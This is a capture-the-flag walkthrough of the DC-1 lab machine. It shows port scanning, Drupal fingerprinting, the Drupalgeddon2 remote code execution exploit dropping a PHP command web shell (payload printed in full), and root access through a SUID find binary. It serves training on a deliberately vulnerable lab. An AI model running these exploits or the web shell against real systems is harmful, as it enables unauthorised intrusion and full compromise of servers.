# DC-1

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Type: PG Play
Difficulty: Fundamental
Community Rating: Easy
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
OS: Linux
Points: 5
Lab Description:
In this lab, we will exploit a vulnerable Drupal 7.x web application using a Remote Code 
Execution (RCE) exploit known as Drupalgeddon2. After obtaining a foothold, we will 
escalate privileges to root by abusing an SUID binary (find) that allows us to bypass 
system restrictions.
Released: 4 Apr 2022
```

Machine link: [https://portal.offsec.com/machine/dc-1-37495/overview/details](https://portal.offsec.com/machine/dc-1-37495/overview/details)

## Solution

### Scan for services with nmap

We start by scanning the machine on all ports with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/DC-1]
└─$ export TARGET_IP=192.168.199.193

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/DC-1]
└─$ sudo nmap -sC -sV -p- $TARGET_IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-20 16:21 CET
Nmap scan report for 192.168.199.193
Host is up (0.034s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-server-header: Apache/2.2.22 (Debian)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Drupal Site | Drupal Site
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          45918/udp   status
|   100024  1          51796/tcp   status
|   100024  1          54854/udp6  status
|_  100024  1          56450/tcp6  status
51796/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.46 seconds
```

We have four services running:

- OpenSSH 6.0p1 on port 22
- Apache httpd 2.2.22 on port 80
- rpcbind 2-4 on (RPC portmapper) port 111
- Unknown RPC service on port 51796

### Check the web site

Browsing manually to port 80 shows a Drupal login portal.

![Drupal Site at DC-1](Images/Drupal_Site_at_DC-1.png)

In the HTML-source we find the major version of Drupal

```html
<!---snip--->
<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
  <title>Welcome to Drupal Site | Drupal Site</title>
<!---snip--->
```

We can also do some basic HTTP-enumeration with nmap

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/DC-1]
└─$ nmap -v -p 80 --script http-enum $TARGET_IP 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-20 16:45 CET
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:45
Completed NSE at 16:45, 0.00s elapsed
Initiating Ping Scan at 16:45
Scanning 192.168.199.193 [4 ports]
Completed Ping Scan at 16:45, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:45
Completed Parallel DNS resolution of 1 host. at 16:45, 0.09s elapsed
Initiating SYN Stealth Scan at 16:45
Scanning 192.168.199.193 [1 port]
Discovered open port 80/tcp on 192.168.199.193
Completed SYN Stealth Scan at 16:45, 0.05s elapsed (1 total ports)
NSE: Script scanning 192.168.199.193.
Initiating NSE at 16:45
Completed NSE at 16:47, 131.14s elapsed
Nmap scan report for 192.168.199.193
Host is up (0.031s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /rss.xml: RSS or Atom feed
|   /robots.txt: Robots file
|   /UPGRADE.txt: Drupal file
|   /INSTALL.txt: Drupal file
|   /INSTALL.mysql.txt: Drupal file
|   /INSTALL.pgsql.txt: Drupal file
|   /: Drupal version 7 
|   /README: Interesting, a readme.
|   /README.txt: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /user/: Potentially interesting folder

NSE: Script Post-scanning.
Initiating NSE at 16:47
Completed NSE at 16:47, 0.00s elapsed
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 131.57 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)
```

The `robots.txt` file contains just a red herring

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/DC-1]
└─$ curl http://$TARGET_IP/robots.txt 
#
# robots.txt
#
# This file is to prevent the crawling and indexing of certain parts
# of your site by web crawlers and spiders run by sites like Yahoo!
# and Google. By telling these "robots" where not to go on your site,
# you save bandwidth and server resources.
#
# This file will be ignored unless it is at the root of your host:
# Used:    http://example.com/robots.txt
# Ignored: http://example.com/site/robots.txt
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/wc/robots.html
#
# For syntax checking, see:
# http://www.sxw.org.uk/computing/robots/check.html

User-agent: *
Crawl-delay: 10
# Directories
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
```

### Scan Drupal with droopescan

Next, we can scan Drupal with droopescan

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/DC-1]
└─$ source ~/Python_venvs/Python3.10/bin/activate    

┌──(Python3.10)─(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/DC-1]
└─$ droopescan scan drupal -u http://$TARGET_IP/ -t 32
[+] Plugins found:                                                              
    ctools http://192.168.199.193/sites/all/modules/ctools/
        http://192.168.199.193/sites/all/modules/ctools/LICENSE.txt
        http://192.168.199.193/sites/all/modules/ctools/API.txt
    views http://192.168.199.193/sites/all/modules/views/
        http://192.168.199.193/sites/all/modules/views/README.txt
        http://192.168.199.193/sites/all/modules/views/LICENSE.txt
    profile http://192.168.199.193/modules/profile/
    php http://192.168.199.193/modules/php/
    image http://192.168.199.193/modules/image/

[+] Themes found:
    seven http://192.168.199.193/themes/seven/
    garland http://192.168.199.193/themes/garland/

[+] Possible version(s):
    7.22
    7.23
    7.24
    7.25
    7.26

[+] Possible interesting urls found:
    Default admin - http://192.168.199.193/user/login

[+] Scan finished (0:05:26.944394 elapsed)
```

Now we have a better understanding of the likely version.

### Search for an exploit

Let's see if there are any available exploits for Drupal version 7.22-7.26

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/DC-1]
└─$ searchsploit drupal 7           
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal 10.1.2 - web-cache-poisoning-External-service-interaction                                                                                                           | php/webapps/51723.txt
Drupal 4.1/4.2 - Cross-Site Scripting                                                                                                                                      | php/webapps/22940.txt
Drupal 4.5.3 < 4.6.1 - Comments PHP Injection                                                                                                                              | php/webapps/1088.pl
Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution                                                                                                                | php/webapps/1821.php
Drupal 4.x - URL-Encoded Input HTML Injection                                                                                                                              | php/webapps/27020.txt
Drupal 5.2 - PHP Zend Hash ation Vector                                                                                                                                    | php/webapps/4510.txt
Drupal 6.15 - Multiple Persistent Cross-Site Scripting Vulnerabilities                                                                                                     | php/webapps/11060.txt
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                                                                                                          | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                                                                                                           | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)                                                                                                | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)                                                                                                | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                                                                                   | php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                                                                                                                     | php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution                                                                                                                         | php/webapps/41564.php
Drupal < 4.7.6 - Post Comments Remote Command Execution                                                                                                                    | php/webapps/3313.pl
Drupal < 5.1 - Post Comments Remote Command Execution                                                                                                                      | php/webapps/3312.pl
Drupal < 5.22/6.16 - Multiple Vulnerabilities                                                                                                                              | php/webapps/33706.txt
Drupal < 7.34 - Denial of Service                                                                                                                                          | php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                                   | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                                   | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                                                | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                                        | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                                    | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                                    | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                                           | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                                      | php/remote/46510.rb
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                                      | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                                                                             | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                                                                         | php/webapps/46459.py
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                                                                                                          | php/webapps/44501.txt
Drupal avatar_uploader v7.x-1.0-beta8 - Cross Site Scripting (XSS)                                                                                                         | php/webapps/50841.txt
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                                                                     | php/webapps/25493.txt
Drupal Module CODER 2.5 - Remote Command Execution (Metasploit)                                                                                                            | php/webapps/40149.rb
Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution                                                                                                              | php/remote/40144.php
Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cross-Site Scripting                                                                                                    | php/webapps/35397.txt
Drupal Module Drag & Drop Gallery 6.x-1.5 - 'upload.php' Arbitrary File Upload                                                                                             | php/webapps/37453.php
Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/Media: Audio Flotsam - Multiple Vulnerabilities                                                               | php/webapps/35072.txt
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                                                                                          | php/remote/40130.rb
Drupal Module Sections - Cross-Site Scripting                                                                                                                              | php/webapps/10485.txt
Drupal Module Sections 5.x-1.2/6.x-1.2 - HTML Injection                                                                                                                    | php/webapps/33410.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

There are a number of RCE-exploits to try. After some looking around I ended up choosing this one

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/DC-1]
└─$ searchsploit -m 44449
  Exploit: Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/44449
     Path: /usr/share/exploitdb/exploits/php/webapps/44449.rb
    Codes: CVE-2018-7600
 Verified: True
File Type: Ruby script, ASCII text
Copied to: /mnt/hgfs/OffSec_PG/PG_Play/Easy/DC-1/44449.rb

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/DC-1]
└─$ ruby 44449.rb
<internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:136:in `require': cannot load such file -- highline/import (LoadError)
        from <internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:136:in `require'
        from 44449.rb:16:in `<main>'

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/DC-1]
└─$ sudo gem install highline
[sudo] password for kali: 
Fetching highline-3.1.2.gem
Successfully installed highline-3.1.2
Parsing documentation for highline-3.1.2
Installing ri documentation for highline-3.1.2
Done installing documentation for highline after 1 seconds
1 gem installed

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/DC-1]
└─$ ruby 44449.rb            
Usage: ruby drupalggedon2.rb <target> [--authentication] [--verbose]
Example for target that does not require authentication:
       ruby drupalgeddon2.rb https://example.com
Example for target that does require authentication:
       ruby drupalgeddon2.rb https://example.com --authentication
```

### Get a reverse shell

Next, we try out the exploit and get a reverse shell

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/DC-1]
└─$ ruby 44449.rb http://$TARGET_IP          
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://192.168.199.193/
--------------------------------------------------------------------------------
[!] MISSING: http://192.168.199.193/CHANGELOG.txt    (HTTP Response: 404)
[!] MISSING: http://192.168.199.193/core/CHANGELOG.txt    (HTTP Response: 404)
[+] Found  : http://192.168.199.193/includes/bootstrap.inc    (HTTP Response: 403)
[!] MISSING: http://192.168.199.193/core/includes/bootstrap.inc    (HTTP Response: 404)
[+] Found  : http://192.168.199.193/includes/database.inc    (HTTP Response: 403)
[+] URL    : v7.x/6.x?
[+] Found  : http://192.168.199.193/    (HTTP Response: 200)
[+] Metatag: v7.x/6.x [Generator]
[!] MISSING: http://192.168.199.193/    (HTTP Response: 200)
[+] Drupal?: v7.x/6.x
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo BFGAAVHS
[+] Result : BFGAAVHS
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://192.168.199.193/shell.php)
[!] Response: HTTP 200 // Size: 7.   ***Something could already be there?***
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://192.168.199.193/shell.php' -d 'c=hostname'
DC-1>> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
DC-1>> 
```

### Get the user flag

Now we can start looking for the user flag

```bash
DC-1>> find / -type f -name local.txt 2>/dev/null
[!] WARNING: Detected an known bad character (>)
/home/local.txt
DC-1>> cat /home/local.txt
7<REDACTED>6
DC-1>> 
```

Nice, so far so good.

### Enumeration for privesc

We now enumerate the system for privilege escalation opportunities.

Checking for SUID/GUID-binaries, we find the following

```bash
DC-1>> find / -type f -perm /6000 -ls 2>/dev/null
[!] WARNING: Detected an known bad character (>)
  4108   88 -rwsr-xr-x   1 root     root        88744 Dec 10  2012 /bin/mount
  7383   32 -rwsr-xr-x   1 root     root        31104 Apr 13  2011 /bin/ping
  3290   36 -rwsr-xr-x   1 root     root        35200 Feb 27  2017 /bin/su
  7385   36 -rwsr-xr-x   1 root     root        35252 Apr 13  2011 /bin/ping6
  4110   68 -rwsr-xr-x   1 root     root        67704 Dec 10  2012 /bin/umount
 31125  128 -rwxr-sr-x   1 root     ssh        128396 Jan 27  2018 /usr/bin/ssh-agent
 30578   52 -rwsr-sr-x   1 daemon   daemon      50652 Oct  4  2014 /usr/bin/at
 30952   32 -rwxr-sr-x   1 root     mlocate     30492 Sep 25  2010 /usr/bin/mlocate
 31154   20 -rwxr-sr-x   1 root     mail        17908 Nov 18  2017 /usr/bin/lockfile
  5033   36 -rwsr-xr-x   1 root     root        35892 Feb 27  2017 /usr/bin/chsh
  5031   52 -rwxr-sr-x   1 root     shadow      49364 Feb 27  2017 /usr/bin/chage
   260   12 -rwxr-sr-x   1 root     tty          9708 Jun 11  2012 /usr/bin/bsd-write
  5036   48 -rwsr-xr-x   1 root     root        45396 Feb 27  2017 /usr/bin/passwd
  3300   32 -rwsr-xr-x   1 root     root        30880 Feb 27  2017 /usr/bin/newgrp
  5032   44 -rwsr-xr-x   1 root     root        44564 Feb 27  2017 /usr/bin/chfn
 31053   12 -rwxr-sr-x   1 root     mail         9768 Nov 30  2014 /usr/bin/mutt_dotlock
  1052   20 -rwxr-sr-x   1 root     tty         18020 Dec 10  2012 /usr/bin/wall
  5837   36 -rwxr-sr-x   1 root     crontab     34760 Jul  4  2012 /usr/bin/crontab
  5034   20 -rwxr-sr-x   1 root     shadow      18168 Feb 27  2017 /usr/bin/expiry
  5035   68 -rwsr-xr-x   1 root     root        66196 Feb 27  2017 /usr/bin/gpasswd
 31155   84 -rwsr-sr-x   1 root     mail        83912 Nov 18  2017 /usr/bin/procmail
  2091  160 -rwsr-xr-x   1 root     root       162424 Jan  6  2012 /usr/bin/find
 28831   16 -rwxr-sr-x   1 root     mail        13960 Dec 12  2012 /usr/bin/dotlockfile
 30731  916 -rwsr-xr-x   1 root     root       937564 Feb 11  2018 /usr/sbin/exim4
  2577   12 -rwsr-xr-x   1 root     root         9660 Jun 20  2017 /usr/lib/pt_chown
144330  244 -rwsr-xr-x   1 root     root       248036 Jan 27  2018 /usr/lib/openssh/ssh-keysign
  7139    8 -rwsr-xr-x   1 root     root         5412 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
145809  316 -rwsr-xr--   1 root     messagebus   321692 Feb 10  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
146420    8 -rwxr-sr-x   1 root     utmp         4972 Feb 21  2011 /usr/lib/utempter/utempter
  1807   32 -rwxr-sr-x   1 root     shadow      30332 May  5  2012 /sbin/unix_chkpwd
 31105   84 -rwsr-xr-x   1 root     root        84532 May 22  2013 /sbin/mount.nfs
find: `/proc/3554/task/3554/fd/5': No such file or directory
find: `/proc/3554/task/3554/fdinfo/5': No such file or directory
find: `/proc/3554/fd/5': No such file or directory
find: `/proc/3554/fdinfo/5': No such file or directory
DC-1>> 
```

From the list [find](https://gtfobins.org/gtfobins/find/) looks like a good choice.

### Get the root flag

Finally, we get the root flag

```bash
DC-1>> find /root/proof.txt -exec cat {} \;
b<REDACTED>8
DC-1>> 
```

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [curl - Homepage](https://curl.se/)
- [curl - Linux manual page](https://man7.org/linux/man-pages/man1/curl.1.html)
- [cURL - Wikipedia](https://en.wikipedia.org/wiki/CURL)
- [droopescan - GitHub](https://github.com/SamJoan/droopescan)
- [droopescan - PyPI](https://pypi.org/project/droopescan/)
- [Drupal - Wikipedia](https://en.wikipedia.org/wiki/Drupal)
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [find - GTFOBins](https://gtfobins.org/gtfobins/find/)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [Portmap - Wikipedia](https://en.wikipedia.org/wiki/Portmap)
- [robots.txt - Wikipedia](https://en.wikipedia.org/wiki/Robots.txt)
- [Ruby (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Ruby_(programming_language))
- [searchsploit - Kali Tools](https://www.kali.org/tools/exploitdb/#searchsploit)
- [Setuid - Wikipedia](https://en.wikipedia.org/wiki/Setuid)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [Sun RPC - Wikipedia](https://en.wikipedia.org/wiki/Sun_RPC)
